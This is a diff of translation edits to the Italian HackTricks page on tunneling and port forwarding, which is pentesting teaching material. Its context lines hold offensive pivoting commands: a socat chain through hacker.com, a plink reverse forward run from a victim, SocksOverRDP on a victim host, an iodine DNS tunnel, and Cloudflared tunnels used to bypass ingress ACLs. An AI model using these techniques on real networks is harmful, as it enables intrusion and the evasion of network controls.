@@ -1,11 +1,11 @@
-# Tunneling e Port Forwarding
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Suggerimento Nmap
+## Nmap tip
 
 > [!WARNING]
-> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché questo funzioni.
+> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.
 
 ## **Bash**
 
@@ -94,7 +94,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
-Ad esempio, inoltrando tutto il traffico verso 10.10.10.0/24
+Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -294,9 +294,7 @@ Puoi bypassare un **proxy non autenticato** eseguendo questa riga invece dell'ul
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
-### Tunnel SSL Socat
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
@@ -326,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un client ssh).
 
-Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
+Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio e la nostra porta ssh in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -360,7 +358,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connettersi** tramite **RDP** e caricare ed eseguire nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -368,7 +366,7 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare da proxy al traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
@@ -387,7 +385,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autenticandosi contro un proxy, crea un collegamento a una porta locale che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
+Autenticandosi contro un proxy, crea un binding di una porta localmente che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
 Ad esempio, inoltra la porta 443.
 ```
 Username Alice
@@ -409,7 +407,7 @@ Un reverse proxy creato da Microsoft. Puoi trovarlo qui: [https://github.com/mic
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare dati tra di essi utilizzando query DNS.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando query DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -574,7 +572,7 @@ Inizia il connettore:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL in ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile.
+Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL di ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile.
 
 ## FRP (Fast Reverse Proxy)
 
